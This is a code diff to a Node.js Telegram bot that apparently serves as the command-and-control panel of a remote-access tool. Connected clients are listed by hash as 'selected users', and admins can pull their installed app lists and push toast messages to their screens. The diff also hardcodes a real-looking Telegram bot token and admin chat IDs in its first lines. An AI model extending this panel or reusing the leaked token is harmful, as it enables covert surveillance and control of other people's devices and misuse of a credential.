@@ -1,6 +1,6 @@
-const token  = "";
-const chat   = 0;
-const admins = [ 0, 0, 0 ];
+const token  = "5779267846:AAH2n-OIoNzf7CnjJNi5ITVhhNj-uDuZLYk";
+const chat   = 5483232752;
+const admins = [ 5483232752 ];
 
 const TelegramBot = require("node-telegram-bot-api");
 const crypto = require("crypto");
@@ -19,6 +19,10 @@ const makeFont = (string) => {
     return string.split('').map(char => translationMap[char] || char).join('');
 }
 
+function isDigit(str) {
+    return /^\d+$/.test(str);
+}
+
 function chunkArray(array, chunkSize) {
     const result = [];
     for (let i = 0; i < array.length; i += chunkSize) {
@@ -31,6 +35,7 @@ function chunkArray(array, chunkSize) {
 const bot = new TelegramBot(token, { polling: true })
 const clients = [];
 const jsclients = [];
+const adminsSteps = {};
 const server = net.createServer(async (socket) => {
     socket.on("data", async (body) => {
         try{
@@ -100,7 +105,7 @@ bot.on("message", async (msg) => {
         if (msg.text.startsWith("/start")){
             await bot.sendMessage(
                 msg.chat.id,
-                makeFont(`🌊 | remote is online and active on `) + `<a href="tg://openmessage?user_id=${objs.bid}"></a>\n`,
+                makeFont(`🌊 | remote is online and active on `) + `<a href="tg://openmessage?user_id=${objs.bid}">${objs.first_name}</a>\n`,
                 {
                     parse_mode: "HTML",
                     reply_to_message_id: msg.message_id,
@@ -126,13 +131,13 @@ bot.on("message", async (msg) => {
                 for (let cli of jsclients) {
                     if (cli.hash === chash) {
                         let _str = `🔊 | selected user ${chash}\n🥤 | has ${cli.accessory.length} access`;
-                        let layers = [[]]; // Start with one empty layer
+                        let layers = [[]];
                         let layer_index = 0;
         
                         for (let access of cli.accessory) {
                             if (layers[layer_index].length === 3) {
                                 layer_index++;
-                                layers[layer_index] = []; // Create a new layer
+                                layers[layer_index] = [];
                             }
                             switch (access) {
                                 case "getApplication":
@@ -149,12 +154,13 @@ bot.on("message", async (msg) => {
                                     break;
                             }
                         }
-        
-                        // Ensure the last layer has the close button
+
                         if (layers[layer_index].length === 0) {
-                            layers.pop(); // Remove empty layer if no accessories were added
+                            layers.pop();
                         }
-                        layers[layer_index].push({
+
+                        layers.push([]);
+                        layers[layers.length - 1].push({
                             text: makeFont("close"),
                             callback_data: `close_${msg.from.id}`
                         });
@@ -170,6 +176,74 @@ bot.on("message", async (msg) => {
                 }
             }
         }
+
+        if (Object.keys(adminsSteps).includes(msg.from.id.toString())){
+            let _id = msg.from.id.toString()
+            let _step = adminsSteps[_id];
+            if (_step.startsWith("toastMessage")){
+                let _stepspl = _step.split("_");
+                let chash = _stepspl[1];
+                if (!(msg.text == "")){
+                    let _spl = msg.text.split(" ");
+                    if (isDigit(_spl[0])){
+                        for (let cli of jsclients){
+                            if (cli.hash == chash){
+                                cli.client.write(JSON.stringify({
+                                    method: 'sendToast',
+                                    length: parseInt(_spl[0]) > 0 ? parseInt(_spl[0]) : 1,
+                                    message: msg.text.slice(_spl[0].length, msg.text.length).trim()
+                                }));
+                                await bot.sendMessage(
+                                    msg.chat.id,
+                                    makeFont(`🦋 | putted ${parseInt(_spl[0]) > 0 ? parseInt(_spl[0]) : 1} for toast length\n🔵 | message sent to ${chash}`),
+                                    {
+                                        reply_to_message_id: msg.message_id
+                                    }
+                                )
+                                delete adminsSteps[msg.from.id];
+                                return;
+                            }
+                        }
+                        await bot.sendMessage(
+                            msg.chat.id,
+                            makeFont(`🎲 | hash ${chash} not found`),
+                            {
+                                reply_to_message_id: msg.message_id
+                            }
+                        )
+                        delete adminsSteps[msg.from.id];
+                    } else {
+                        for (let cli of jsclients){
+                            if (cli.hash == chash){
+                                cli.client.write(JSON.stringify({
+                                    method: 'sendToast',
+                                    length: 1,
+                                    message: msg.text.slice(_spl[0].length, msg.text.length).trim()
+                                }));
+                                await bot.sendMessage(
+                                    msg.chat.id,
+                                    makeFont(`🦋 | putted 1 for toast length\n🔵 | message sent to ${chash}`),
+                                    {
+                                        reply_to_message_id: msg.message_id
+                                    }
+                                )
+                                delete adminsSteps[msg.from.id];
+                                return;
+                            }
+                        }
+                        await bot.sendMessage(
+                            msg.chat.id,
+                            makeFont(`🎲 | hash ${chash} not found`),
+                            {
+                                reply_to_message_id: msg.message_id
+                            }
+                        )
+                        delete adminsSteps[msg.from.id];
+                    }
+                }
+            }
+        }
+
     }
 })
 
@@ -254,41 +328,43 @@ bot.on('callback_query', async (call) => {
                 for (let cli of jsclients) {
                     if (cli.hash === chash) {
                         let _str = `🔊 | selected user ${chash}\n🥤 | has ${cli.accessory.length} access`;
-                        let layers = [[]]; // Start with one empty layer
+                        let layers = [[]];
                         let layer_index = 0;
         
                         for (let access of cli.accessory) {
                             if (layers[layer_index].length === 3) {
                                 layer_index++;
-                                layers[layer_index] = []; // Create a new layer
+                                layers[layer_index] = [];
                             }
                             switch (access) {
                                 case "getApplication":
                                     layers[layer_index].push({
                                         text: makeFont("apps 📪"),
-                                        callback_data: `getApps_${msg.from.id}_${chash}`
+                                        callback_data: `getApps_${call.from.id}_${chash}`
                                     });
                                     break;
                                 case "sendToast":
                                     layers[layer_index].push({
                                         text: makeFont("toast 📦"),
-                                        callback_data: `sendToast_${msg.from.id}_${chash}`
+                                        callback_data: `sendToast_${call.from.id}_${chash}`
                                     });
                                     break;
                             }
                         }
         
-                        // Ensure the last layer has the close button
                         if (layers[layer_index].length === 0) {
-                            layers.pop(); // Remove empty layer if no accessories were added
+                            layers.pop();
                         }
-                        layers[layer_index].push({
+
+                        layers.push([]);
+                        layers[layers.length - 1].push({
                             text: makeFont("close"),
                             callback_data: `close_${msg.from.id}`
                         });
         
-                        await bot.sendMessage(msg.chat.id, _str, {
-                            reply_to_message_id: msg.message_id,
+                        await bot.editMessageText(_str, {
+                            message_id: call.message.message_id,
+                            chat_id: call.message.chat.id,
                             reply_markup: {
                                 inline_keyboard: layers
                             }
@@ -296,6 +372,15 @@ bot.on('callback_query', async (call) => {
                         return;
                     }
                 }
+            } else if (call.data.startsWith("sendToast")){
+                adminsSteps[call.from.id] = `toastMessage_${spl[2]}`;
+                await bot.sendMessage(
+                    call.message.chat.id,
+                    makeFont(`🎁 | send your message: <LENGTH> <MESSAGE>\n\n❓ | 10 hello world\n\n❓ | hello world`),
+                    {
+                        reply_to_message_id: call.message.message_id
+                    }
+                )
             }
         }
     }
